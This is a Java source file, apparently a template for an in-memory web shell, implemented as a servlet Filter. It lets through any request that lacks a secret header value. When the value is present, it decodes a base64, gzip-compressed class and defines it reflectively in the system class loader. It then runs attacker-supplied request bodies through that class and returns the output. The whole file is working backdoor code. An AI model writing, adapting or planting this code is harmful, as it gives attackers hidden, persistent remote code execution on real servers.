package org.leo.jmg.mem.shell.http;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.zip.GZIPInputStream;

public class LeoFilterTpl implements Filter {

    private static String headerName;
    private static String headerValue;

    private static String coreClassName;
    private static String coreClass;
    private static int respCode;

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest)servletRequest;
        HttpServletResponse response = (HttpServletResponse)servletResponse;
        String actualHeader = request.getHeader(headerName);
        if (actualHeader == null || !actualHeader.contains(headerValue)) {
            filterChain.doFilter(servletRequest, servletResponse);
            return;
        }

        response.setStatus(respCode);
        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int bytesRead;
            try {
                Class.forName(coreClassName,true,ClassLoader.getSystemClassLoader());
            } catch (ClassNotFoundException e) {
                GZIPInputStream gzipInputStream=new GZIPInputStream(new ByteArrayInputStream(base64Decode(coreClass)));
                while ((bytesRead = gzipInputStream.read(buffer)) != -1) {
                    byteArrayOutputStream.write(buffer, 0, bytesRead);
                }
                Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",new Class[]{String.class, byte[].class, int.class, int.class});
                defineClassMethod.setAccessible(true);
                defineClassMethod.invoke(ClassLoader.getSystemClassLoader(),new Object[]{null, byteArrayOutputStream.toByteArray(), (Object) 0, (Object) byteArrayOutputStream.size()});
            }
            finally {
                InputStream inputStream = request.getInputStream();
                byteArrayOutputStream.reset();
                while ((bytesRead = inputStream.read(buffer)) != -1) {
                    byteArrayOutputStream.write(buffer, 0, bytesRead);
                }
                try {
                    ((java.lang.reflect.InvocationHandler) Class.forName(coreClassName,true,ClassLoader.getSystemClassLoader()).newInstance()).invoke(null, null, new Object[]{byteArrayOutputStream});
                } catch (Throwable e) {
                    throw new IllegalStateException("Core invocation failed", e);
                }
                response.getOutputStream().write(byteArrayOutputStream.toByteArray());
            }
        } catch (Exception ignored) {
        }
    }

    @Override
    public void destroy() {
    }
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
}
